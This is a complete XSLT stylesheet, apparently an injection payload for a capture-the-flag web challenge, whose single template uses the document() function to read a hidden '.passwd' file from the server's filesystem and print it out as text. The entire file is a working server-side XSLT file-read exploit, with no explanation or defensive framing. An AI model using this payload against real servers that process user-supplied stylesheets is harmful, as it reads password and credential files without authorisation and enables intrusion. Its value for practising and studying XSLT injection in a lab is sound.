<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:output method="text" encoding="UTF-8"/>

  <xsl:template match="/">
    <xsl:copy-of select="document('file:///challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
  </xsl:template>

</xsl:stylesheet>
